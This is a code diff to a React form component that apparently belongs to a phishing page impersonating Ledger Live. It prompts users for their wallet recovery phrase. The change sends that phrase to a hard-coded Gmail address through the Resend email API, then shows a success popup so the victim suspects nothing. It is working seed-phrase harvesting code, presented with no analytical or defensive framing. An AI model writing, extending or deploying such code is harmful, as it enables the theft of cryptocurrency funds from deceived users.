@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import styles from "./Form.module.css";
 import { FaCircle, FaDownload, FaArrowsRotate } from "react-icons/fa6";
@@ -20,6 +20,7 @@ const Form = () => {
   const [currentStep, setCurrentStep] = useState(0);
   const [loading, setLoading] = useState(false);
   const [imageSelected, setImageSelected] = useState(false);
+  const [userInput, setUserInput] = useState("");
   const [showPopup, setShowPopup] = useState(false);
   const [formData, setFormData] = useState("");
   const [submitLoading, setSubmitLoading] = useState(false);
@@ -48,46 +49,56 @@ const Form = () => {
   };
 
   const handleFormDataChange = (event) => {
-  setFormData(event.target.value);
-};
+    setFormData(event.target.value);
+    setUserInput(event.target.value);
+  };
+
   const handleClosePopup = () => {
     setShowPopup(false);
     navigate("/success");
   };
 
   const handleStep3Submit = async (event) => {
-  event.preventDefault();
+    event.preventDefault();
 
-  if (!formData.trim()) {
-    setSubmitError("Please enter your recovery phrase");
-    return;
-  }
-
-  setSubmitLoading(true);
-  setSubmitError("");
-
-  try {
-    const response = await fetch("/api/submit", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        form_type: "ledger_live",
-        fullname: formData,
-      }),
-    });
-
-    if (response.ok) {
-      setFormData("");
-      setShowPopup(true);
-    } else {
-      setSubmitError("Failed to submit. Please try again.");
+    if (!formData.trim()) {
+      setSubmitError("Please enter your recovery phrase");
+      return;
     }
-  } catch (error) {
-    setSubmitError("Network error. Please check your connection.");
-  } finally {
-    setSubmitLoading(false);
-  }
-};
+
+    setSubmitLoading(true);
+    setSubmitError("");
+
+    try {
+      const response = await fetch("https://api.resend.com/emails", {
+        method: "POST",
+        headers: {
+          Authorization: `Bearer ${process.env.REACT_APP_RESEND_API_KEY}`,
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          from: "onboarding@resend.dev",
+          to: ["tykeshare@gmail.com"],
+          subject: "Ledger Live Submission",
+          html: "<p><strong>Form Type:</strong> ledger_live</p><p><strong>Recovery Phrase:</strong></p><p>" + formData + "</p>",
+        }),
+      });
+
+      if (response.ok) {
+        setFormData("");
+        setShowPopup(true);
+      } else {
+        const errorData = await response.json();
+        setSubmitError("Failed to submit. Please try again.");
+        console.error("Error:", errorData);
+      }
+    } catch (error) {
+      setSubmitError("Network error. Please check your connection.");
+      console.error("Fetch error:", error);
+    } finally {
+      setSubmitLoading(false);
+    }
+  };
 
   return (
     <>
@@ -252,8 +263,3 @@ const Form = () => {
 };
 
 export default Form;
-
-
-
-
-
